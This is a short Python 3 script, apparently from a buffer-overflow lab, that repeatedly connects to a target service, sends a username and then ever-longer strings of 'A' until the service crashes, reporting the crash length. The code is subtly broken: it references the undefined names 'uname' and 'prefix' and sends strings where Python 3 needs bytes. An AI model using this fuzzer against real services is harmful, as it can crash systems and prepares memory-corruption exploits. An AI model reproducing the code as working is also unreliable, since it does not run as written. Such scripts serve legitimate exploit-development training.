#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP" # Put the objetive IP
username = "User" # Example User

port = 1337 # Replace with the destination port.
timeout = 5

string = "A" * 100 # Payload

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      s.send(uname + '\r\n') # Send the username
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1")) # Send the payload
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
